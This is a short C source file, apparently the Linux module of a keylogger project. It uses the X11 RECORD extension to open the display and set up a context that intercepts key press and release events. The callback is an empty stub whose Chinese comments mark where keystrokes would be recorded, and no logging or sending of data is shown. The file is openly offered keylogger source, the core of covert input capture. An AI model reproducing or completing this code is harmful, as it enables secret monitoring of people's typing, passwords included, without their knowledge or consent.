#include "keylogger.h"
#include <X11/Xlib.h>
#include <X11/extensions/record.h>
#include <X11/extensions/XTest.h>

// Linux-specific implementation

void recordCallback(XPointer priv, XRecordInterceptData *hook) {
    if (hook->category == XRecordFromServer) {
        // 处理键盘事件
        // 可以在此处调用记录函数
    }
    XRecordFreeData(hook);
}

void startLinuxKeylogger() {
    Display *display = XOpenDisplay(NULL);
    if (!display) return;

    XRecordContext rc;
    XRecordRange *rr = XRecordAllocRange();
    rr->device_events.first = KeyPress;
    rr->device_events.last = KeyRelease;

    rc = XRecordCreateContext(display, 0, &rr, 1);
    if (!rc) return;

    XRecordEnableContext(display, rc, recordCallback, NULL);
    XRecordFreeContext(display, rc);
    XCloseDisplay(display);
}
